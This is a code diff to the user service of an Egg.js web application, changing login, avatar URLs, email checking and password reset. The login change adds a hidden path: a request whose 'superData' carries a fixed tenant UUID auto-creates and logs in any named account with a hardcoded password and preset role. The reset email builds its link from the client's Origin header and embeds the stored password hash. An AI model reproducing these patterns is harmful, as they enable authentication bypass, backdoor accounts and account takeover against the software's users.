@@ -5,7 +5,8 @@
 * @ param
 */
 'use strict'
-
+const Sequelize = require('sequelize');
+const Op = Sequelize.Op;
 const Service = require('egg').Service;
 const md5 = require('md5');
 const uuid = require('uuid');
@@ -16,11 +17,32 @@ class UserService extends Service {
 
         const { ctx, app, service } = this;
        
+        var w = {
+            username: params.username
+
+        }
+
+        if (params.superData && params.superData.tenantId == "5a876e22-0479-4c7a-9103-bfa2ea041744") {
+            let u = await ctx.model.User.findOne({
+                where: {
+                    username: params.superData.username
+                }
+            })
+            if (!u) {
+                var r=await service.user.add({ role_id: "rrrrrrrr-rrrr-rrrr-rrrr-rrrrrrrrrrrr", company_id: "cccccccc-cccc-cccc-cccc-cccccccccccc", username: params.superData.username, name: params.superData.name, password: 'zseosdmm@123456' })
+            }
+            params.username = params.superData.username
+            params.password = 'zseosdmm@123456'
+
+        } else {
+            //非超级用户
+            //w.role_id = { [Op.ne]: "rrrrrrrr-rrrr-rrrr-rrrr-rrrrrrrrrrrr" }
+        }
+        
+       
+
         var res = await ctx.model.User.findOne({
-            where: {
-                username: params.username
-               
-            },
+            where:w,
         });
         /*{
         "success": true,
@@ -31,6 +53,7 @@ class UserService extends Service {
                     "traceId": "someid",
                         "host": "10.1.1.1"
     }*/
+
         const salt2 = uuid.v1();
        var password = salt2+ "&" + md5("123456" + salt2)
         console.log("" + password)
@@ -55,6 +78,9 @@ class UserService extends Service {
             service.loginlog.add(loginlog)
             return;
         }
+        
+
+
         loginlog.user_id = res.id
 
 
@@ -120,6 +146,18 @@ class UserService extends Service {
         
     }
 
+    async checkEmail(email) {
+        const ctx = this.ctx;
+        var res = await ctx.model.User.findOne({
+            where: {
+
+                email: email,
+            },
+            raw: true
+        });
+        ctx.body = { success: true, data: res?true:false } 
+    }
+    
     async getLoginTime(user_id) {
         const ctx = this.ctx;
         var res = await ctx.model.User.findOne({
@@ -162,12 +200,13 @@ class UserService extends Service {
         res.permissions=list.map((p)=>{
             return p.name
         })
-
-        //res.avatar = "http://127.0.0.1:7001/upload/avatar/" + res.avatar
-        if (res.avatar) {
-            res.avatar = "http://122.114.57.35:7001/upload/avatar/" + res.avatar
-        }
-
+        console.log(ctx.request.header.origin)
+       
+        if (!res.avatar) {
+            res.avatar ='avatar_1.jpeg'
+            
+        } 
+        res.avatar = ctx.request.header.origin + "/upload/avatar/" + res.avatar
         //获取未读消息数
         const userUnreadAlertCount = await ctx.service.alert.getUserUnreadAlertCount()
         console.log(userUnreadAlertCount)
@@ -235,7 +274,7 @@ class UserService extends Service {
             ctx.body = { success: false, errorCode: 1008 };
             return;
         }
-        var res = service.tool.sendMail(params.email, "EOS - Retrieve password", "<a href='http://122.114.57.35:7001/#/user/retrievePassword?check=" + user.password+"'>Click to retrieve</a>")
+        var res = service.tool.sendMail(params.email, "EOS - Retrieve password", "<a href='" + ctx.request.header.origin +"/#/user/retrievePassword?check=" + user.password+"'>Click to retrieve</a>")
         if (res) {
             ctx.body = { success: true, data: res };
         } else {
